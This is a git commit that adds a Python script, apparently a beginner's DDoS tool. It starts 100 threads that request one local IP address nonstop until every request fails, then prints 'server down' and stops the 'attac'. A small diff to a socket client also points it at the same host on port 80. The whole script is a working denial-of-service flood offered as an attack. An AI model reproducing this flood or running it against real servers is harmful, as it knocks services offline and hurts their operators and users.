4e3cdb7dfc197780d976c2143a9015c8d8c76e77
cantstumpthetrump2000 <camerondrain@gmail.com>
2018-10-05 19:19:43 +0100

    new code

---
+++ ddos/burt_force/burte_force.py
@@ -0,0 +1,48 @@
+import urllib.request
+
+import time
+import threading
+
+is_it_down=[]
+
+stop=False
+tageget="http://192.168.137.75/"
+class myThread (threading.Thread):
+   def __init__(self, threadID,):
+      threading.Thread.__init__(self)
+      self.threadID = threadID
+   def run(self):
+     while stop ==False:
+         try:
+            contents = urllib.request.urlopen(tageget,timeout=20).read()
+            #print(contents)
+         except:
+            is_it_down[self.threadID]=True
+            #print("can get data from server might be dead")
+
+# Create new threads
+therd_list=[]
+for q in range(100):
+    therd_list.append(myThread(q))
+    is_it_down.append(False)
+
+for q in therd_list:
+    q.start()
+
+
+
+
+while stop==False:
+    temp=True
+    for q in is_it_down:
+        if q==False:
+            temp=False
+    if temp==True:
+        print("server down")
+        time.sleep(5)
+        stop=True
+
+print("stoping attac ")
+
+
+
--- python_scokets/sevr_cllint1/clinet.py
+++ python_scokets/sevr_cllint1/clinet.py
@@ -2,8 +2,8 @@ import socket
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = '192.168.1.172'
-port = 50008
+host = '192.168.137.75'
+port = 80
 
 s.connect((host,port))
 
